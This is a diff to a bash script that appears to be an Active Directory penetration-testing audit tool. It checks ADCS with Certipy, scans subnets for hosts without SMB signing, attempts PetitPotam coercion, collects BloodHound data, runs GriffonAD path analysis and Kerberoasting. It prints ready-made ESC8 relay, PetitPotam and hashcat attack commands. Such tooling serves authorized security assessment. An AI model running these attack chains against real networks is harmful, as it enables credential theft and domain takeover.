@@ -104,7 +104,7 @@ fi
 
 # Get current directory and create output folder
 CURRENT_PATH=$(pwd)
-OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"
+OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M)"
 mkdir -p "$OUTPUT_DIR"
 
 echo -e "${BLUE}[*] DC FQDN   : ${DC_FQDN}${NC}"
@@ -112,6 +112,26 @@ echo -e "${BLUE}[*] DC IP     : $DC_IP${NC}"
 echo -e "${BLUE}[*] Domain    : $DOMAIN${NC}"
 echo ""
 
+# Check and patch GriffonAD
+GRIFFON_PATH="/workspace/GriffonAD"
+if [ ! -d "$GRIFFON_PATH" ]; then
+  echo -e "${GREY}[--] Installing GriffonAD...${NC}"
+  git clone https://github.com/shellinvictus/GriffonAD "$GRIFFON_PATH" &>/dev/null 2>&1
+  if [ -d "$GRIFFON_PATH" ]; then
+    cd "$GRIFFON_PATH"
+    pip install -r requirements.txt &>/dev/null 2>&1
+    cd "$CURRENT_PATH"
+    echo -e "${GREEN}[OK] GriffonAD installed${NC}"
+  else
+    echo -e "${GREY}[--] GriffonAD installation failed (git clone error)${NC}"
+  fi
+fi
+
+# Apply patch if needed (even if already installed)
+if [ -f "$GRIFFON_PATH/lib/database.py" ] && ! grep -q "if gpo_guid and gpo_guid in self.objects_by_sid" "$GRIFFON_PATH/lib/database.py"; then
+  sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.append(o.dn)/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.append(o.dn)/' "$GRIFFON_PATH/lib/database.py"
+  sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.sort()/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.sort()/' "$GRIFFON_PATH/lib/database.py"
+fi
 
 # ADCS/PKI Vulnerability Check
 if [ -x "/opt/tools/Certipy/venv/bin/certipy" ]; then
@@ -146,7 +166,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
     ' "$CERTIPY_TXT" | sort -u)
     
     if [ ! -z "$VULNS" ]; then
-      echo -e "${RED}[KO] ADCS vulnerabilities found → adcs_certipy.txt${NC}"
+      echo -e "${RED}[KO] ADCS vulnerabilities found → *_Certipy.txt${NC}"
       
       declare -A GROUPED
       while IFS='|' read -r name esc; do
@@ -159,12 +179,25 @@ if [ ! -z "$CERTIPY_CMD" ]; then
       
       for name in "${!GROUPED[@]}"; do
         echo -e "${RED}       └─ $name: ${GROUPED[$name]}${NC}"
-        echo "$name: ${GROUPED[$name]}" >> "$OUTPUT_DIR/adcs_certipy.txt"
         
         # ESC8 Exploitation Commands
         if [[ "${GROUPED[$name]}" =~ ESC8 ]]; then
           CA_HOST=$(echo "$name" | sed 's/CA://')
-          CA_IP=$(dig +short "$CA_HOST" 2>/dev/null | head -1)
+          
+          # Extract DNS Name from Certipy output
+          CA_DNS=$(awk -v ca="$CA_HOST" '
+            /CA Name\s*:/ { if ($NF == ca) found=1 }
+            found && /DNS Name\s*:/ { print $NF; exit }
+          ' "$CERTIPY_TXT")
+          
+          # Fallback to CA_HOST.DOMAIN if no DNS Name found
+          if [ -z "$CA_DNS" ]; then
+            CA_FQDN="${CA_HOST}.${DOMAIN}"
+          else
+            CA_FQDN="$CA_DNS"
+          fi
+          
+          CA_IP=$(dig +short "$CA_FQDN" @$DC_IP 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
           
           # Extract templates suitable for Domain Controllers
           DC_TEMPLATES=$(awk '
@@ -189,8 +222,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
           
           if [ ! -z "$CA_IP" ] && [ ! -z "$DC_TEMPLATES" ]; then
             FIRST_DC_TEMPLATE=$(echo "$DC_TEMPLATES" | cut -d',' -f1)
-            echo -e "${GREY}       └─ Exploitation (ESC8 - DC Templates):${NC}"
-            echo -e "${GREY}          Available: ${DC_TEMPLATES}${NC}"
+            echo -e "${GREY}       └─ ESC8 - DC Templates: ${DC_TEMPLATES}${NC}"
             echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
             echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <TARGET_DC>${NC}"
             echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
@@ -224,26 +256,51 @@ else
   echo -e "${GREEN}[OK] LDAP Signing + Channel Binding enforced${NC}"
 fi
 
-# SMB Signing Check
-SMB_DC_CHECK=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
-if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
-  echo -e "${GREEN}[OK] SMB Signing enforced on DC${NC}"
-else
-  echo -e "${RED}[KO] SMB Signing NOT enforced on DC${NC}"
+# Scan subnet for relay targets (exclude DCs)
+SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
+nxc smb ${SUBNET}.0/24 -u "$USERNAME" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_targets_raw.txt" &>/dev/null
+
+# Get all DC IPs from AD
+DC_IPS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+  -b "$DOMAIN_DN" \
+  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName 2>/dev/null | \
+  grep "^dNSHostName:" | awk '{print $2}' | while read fqdn; do
+    dig +short "$fqdn" 2>/dev/null | grep -E '^[0-9]+\.'
+  done | sort -u)
+
+# Filter out DC IPs from relay targets
+if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
+  > "$OUTPUT_DIR/relay_targets.txt"  # Clear file
+  while IFS= read -r ip; do
+    if ! echo "$DC_IPS" | grep -q "^$ip$"; then
+      echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
+    fi
+  done < "$OUTPUT_DIR/relay_targets_raw.txt"
+  rm "$OUTPUT_DIR/relay_targets_raw.txt"
 fi
 
-# Scan subnet for relay targets
-SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
-nxc smb ${SUBNET}.0/24 -u "$USERNAME" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_targets.txt" &>/dev/null
 RELAY_COUNT=$(wc -l < "$OUTPUT_DIR/relay_targets.txt" 2>/dev/null || echo 0)
 
 if [ "$RELAY_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $RELAY_COUNT host(s) without SMB Signing in ${SUBNET}.0/24 → relay_targets.txt${NC}"
+  echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without SMB Signing → relay_targets.txt${NC}"
 else
-  echo -e "${GREEN}[OK] All hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
+  echo -e "${GREEN}[OK] All non-DC hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
   rm -f "$OUTPUT_DIR/relay_targets.txt"
 fi
-echo -e "${GREY}       └─ nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --gen-relay-list '$OUTPUT_DIR/relay_targets.txt'${NC}"
+echo -e "${GREY}       └─ nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --gen-relay-list '${OUTPUT_DIR}/relay_targets.txt'${NC}"
+
+# SMB Signing Check on DC
+SMB_DC_CHECK=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
+if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
+  echo -e "${GREEN}[OK] SMB Signing required on DC${NC}"
+else
+  echo -e "${RED}[KO] SMB Signing NOT required on DC${NC}"
+  if [ "$RELAY_COUNT" -gt 0 ]; then
+    echo -e "${RED}       └─ Coerce computers from relay_targets.txt to DC${NC}"
+  else
+    echo -e "${GREEN}       └─ Not exploitable: No relay targets without signing in relay_targets.txt found${NC}"
+  fi
+fi
 
 # Unconstrained Delegation Check
 UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
@@ -307,7 +364,7 @@ if echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
   else
     echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
   fi
-  echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
 elif echo "$PETITPOTAM_OUTPUT" | grep -q "probably PATCHED" && ! echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
   echo -e "${GREEN}[OK] PetitPotam (MS-EFSRPC) patched on DC${NC}"
 else
@@ -358,7 +415,7 @@ fi
 if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
   BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
   cd "$OUTPUT_DIR"
-  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE --zip &>/dev/null
+  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
   cd "$CURRENT_PATH"
   
   # Check for BloodHound JSONs
@@ -367,57 +424,36 @@ if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/n
     echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
         echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
 
-    # Check/Install GriffonAD
-    GRIFFON_PATH="/workspace/GriffonAD"
-    if [ ! -d "$GRIFFON_PATH" ]; then
-      echo -e "${GREY}[→] Installing GriffonAD...${NC}"
-      cd /workspace
-      git clone https://github.com/shellinvictus/GriffonAD &>/dev/null 2>&1
-      if [ -d "$GRIFFON_PATH" ]; then
-        cd "$GRIFFON_PATH"
-        pip install -r requirements.txt &>/dev/null 2>&1
-        cd "$CURRENT_PATH"
-        echo -e "${GREEN}[OK] GriffonAD installed${NC}"
-      fi
-    fi
-    
-    # Patch GriffonAD for empty GPO GUIDs
-    if [ -f "$GRIFFON_PATH/lib/database.py" ]; then
-      if ! grep -q "if gpo_guid and gpo_guid in self.objects_by_sid" "$GRIFFON_PATH/lib/database.py"; then
-        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.append(o.dn)/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.append(o.dn)/' "$GRIFFON_PATH/lib/database.py"
-        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.sort()/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.sort()/' "$GRIFFON_PATH/lib/database.py"
-        echo -e "${GREY}[→] Patched GriffonAD for empty GPO GUIDs${NC}"
-      fi
-    fi
-
-    # Run GriffonAD
-    if [ -f "$GRIFFON_PATH/griffon.py" ]; then
-      cd "$OUTPUT_DIR"
-      JSON_FILES=( *.json )
-      if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
-        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
-        if echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
-          echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
-        elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
-          PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
-          echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
-          echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
-            # Extract target from path (last element after last colon or arrow)
-            TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
-            echo -e "${RED}       └─ $TARGET${NC}"
-          done
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
-        else
-          echo -e "${GREY}[--] GriffonAD returned no results (something probably broke)${NC}"
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
-        fi
+  # Run GriffonAD (already installed at start)
+  if [ -f "$GRIFFON_PATH/griffon.py" ]; then
+    cd "$OUTPUT_DIR"
+    JSON_FILES=( *.json )
+    if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
+      GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
+      GRIFFON_EXIT=$?
+      
+      if [ $GRIFFON_EXIT -ne 0 ]; then
+        echo -e "${GREY}[--] GriffonAD failed → griffon_error.txt${NC}"
+        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_error.txt"
+      elif echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
+        echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
+      elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
+        PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
+        echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
+        echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
+          TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
+          echo -e "${RED}       └─ $TARGET${NC}"
+        done
+        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
       else
-        echo -e "${GREY}[--] No JSON files found for GriffonAD${NC}"
+        echo -e "${GREY}[--] GriffonAD no results → griffon_debug.txt${NC}"
+        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
       fi
-      cd "$CURRENT_PATH"
-    else
-      echo -e "${GREY}[--] GriffonAD not found${NC}"
     fi
+    cd "$CURRENT_PATH"
+  else
+    echo -e "${GREY}[--] GriffonAD not found${NC}"
+  fi
   else
     echo -e "${GREY}[--] BloodHound export failed${NC}"
   fi
@@ -519,6 +555,7 @@ if [ ! -z "$GHOST_SPNS" ]; then
       spn_host="${BASH_REMATCH[1]}"
       
       # Skip GUIDs, Azure, Microsoft domains
+      [[ "$spn" =~ ^(NtFrs-|Dfsr-) ]] && continue
       [[ "$spn_host" =~ ^[0-9a-f]{8}-[0-9a-f]{4} ]] && continue
       [[ "$spn_host" =~ nsatc\.net$ ]] && continue
       [[ "$spn_host" =~ windows\.net$ ]] && continue
@@ -572,7 +609,7 @@ if [ "$KERBEROAST_COUNT" -gt 0 ]; then
   grep -oP '(?<=\*)[^$]+(?=\$)' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null | while read -r account; do
     echo -e "${RED}       └─ $account${NC}"
   done
-    echo -e "${GREY}       hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
+    echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
 
 else
   echo -e "${GREEN}[OK] No Kerberoastable accounts found${NC}"
